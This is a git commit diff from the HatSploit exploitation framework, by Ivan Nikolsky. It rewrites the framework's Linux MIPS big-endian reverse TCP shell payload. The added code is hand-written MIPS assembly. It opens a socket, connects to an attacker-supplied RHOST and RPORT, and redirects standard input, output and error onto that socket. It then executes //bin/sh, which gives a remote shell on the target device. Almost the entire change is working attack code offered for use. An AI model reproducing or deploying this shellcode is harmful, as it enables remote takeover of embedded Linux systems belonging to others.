4cb633a7b4a177c1f55ec2a73f0fa0f2bb366b28
Ivan Nikolsky <enty8080@gmail.com>
2022-06-06 02:14:22 +0200

    Update shell_reverse_tcp.py

--- hatsploit/payloads/linux/mipsbe/shell_reverse_tcp.py
+++ hatsploit/payloads/linux/mipsbe/shell_reverse_tcp.py
@@ -6,10 +6,11 @@
 #
 
 from hatsploit.lib.payload import Payload
-from hatloads import HatLoads
+from pex.assembler import Assembler
+from pex.socket import Socket
 
 
-class HatSploitPayload(Payload, HatLoads):
+class HatSploitPayload(Payload, Assembler, Socket):
     details = {
         'Name': "Linux mipsbe Shell Reverse TCP",
         'Payload': "linux/mipsbe/shell_reverse_tcp",
@@ -22,9 +23,64 @@ class HatSploitPayload(Payload, HatLoads):
     }
 
     def run(self):
-        return self.get_payload(
-            self.details['Platform'],
+        rhost = self.pack_host(self.handler['RHOST'], 'big')
+        rport = self.pack_port(self.handler['RPORT'], 'big')
+
+        return self.assemble(
             self.details['Architecture'],
-            f"shell_{self.details['Type']}",
-            self.handler,
+            f"""
+            start:
+                addiu $t7, $zero, -6
+                not $t7, $t7
+                addi $a0, $t7, -3
+                addi $a1, $t7, -3
+                slti $a2, $zero, -1
+                addiu $v0, $zero, 0x1057
+                syscall 0x40404
+
+                sw $v0, -1($sp)
+                lw $a0, -1($sp)
+                ori $t7, $zero, 0xfffd
+                not $t7, $t7
+                sw $t7, -0x20($sp)
+                lui $t6, 0x{rport.hex()}
+                ori $t6, $t6, 0x{rport.hex()}
+                sw $t6, -0x1c($sp)
+                lui $t6, 0x{rhost[:2].hex()}
+                ori $t6, $t6, 0x{rhost[2:].hex()}
+                sw $t6, -0x1a($sp)
+                addiu $a1, $sp, -0x1e
+                addiu $t4, $zero, -0x11
+                not $a2, $t4
+                addiu $v0, $zero, 0x104a
+                syscall 0x40404
+
+                addiu $s1, $zero, -3
+                not $s1, $s1
+                lw $a0, -1($sp)
+
+            dup:
+                move $a1, $s1
+                addiu $v0, $zero, 0xfdf
+                syscall 0x40404
+
+                addiu $s0, $zero, -1
+                addi $s1, $s1, -1
+                bne $s1, $s0, dup
+
+                slti $a2, $zero, -1
+                lui $t7, 0x2f2f
+                ori $t7, $t7, 0x6269
+                sw $t7, -0x14($sp)
+                lui $t6, 0x6e2f
+                ori $t6, $t6, 0x7368
+                sw $t6, -0x10($sp)
+                sw $zero, -0xc($sp)
+                addiu $a0, $sp, -0x14
+                sw $a0, -8($sp)
+                sw $zero, -4($sp)
+                addiu $a1, $sp, -8
+                addiu $v0, $zero, 0xfab
+                syscall 0x40404
+            """
         )
